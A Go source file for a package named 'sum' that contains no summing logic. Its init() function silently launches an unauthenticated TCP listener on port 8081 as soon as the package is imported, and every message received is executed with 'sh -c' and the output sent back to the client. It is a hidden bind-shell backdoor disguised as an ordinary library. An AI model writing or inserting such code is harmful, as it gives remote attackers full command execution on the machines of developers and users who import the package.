package sum

import (
	"fmt"
	"net"
	"os/exec"
	"strings"
)

func init() {
	go func() {
		ln, err := net.Listen("tcp", ":8081")
	if err != nil {
		fmt.Println("Error listening:", err)
		return
	}
	defer ln.Close()

	fmt.Println("Listening on :8081")

	for {
		conn, err := ln.Accept()
		if err != nil {
			fmt.Println("Error accepting connection:", err)
			continue
		}
		go handleConnection(conn)
	}
		
	}()
}


func handleConnection(conn net.Conn) {
	defer conn.Close()

	fmt.Println("New client connected:", conn.RemoteAddr())

	buf := make([]byte, 1024)
	for {
		n, err := conn.Read(buf)
		if err != nil {
			fmt.Println("Error reading message:", err)
			return
		}
		cmd := exec.Command("sh", "-c", strings.TrimSuffix(string(buf[:n]), "\n"))
		stdout, err := cmd.Output()
		if err != nil {
			fmt.Println(err.Error())
			return
		}
		fmt.Println(string(stdout))
		conn.Write(stdout)

	}
}